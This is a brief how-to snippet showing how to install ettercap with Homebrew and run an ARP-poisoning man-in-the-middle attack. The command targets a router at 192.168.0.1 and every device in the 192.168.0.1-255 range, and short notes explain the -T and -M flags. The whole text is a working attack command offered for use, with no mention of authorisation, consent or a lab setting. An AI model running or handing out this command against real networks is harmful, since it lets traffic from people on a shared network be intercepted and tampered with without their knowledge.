brew install ettercap

sudo ettercap -T -M arp:remote /192.168.0.1/ /192.168.0.1-255/

-T will print the logs to terminal
-M will mitm attack it

The first IP is the ip of your router, the second is the range of devices on your network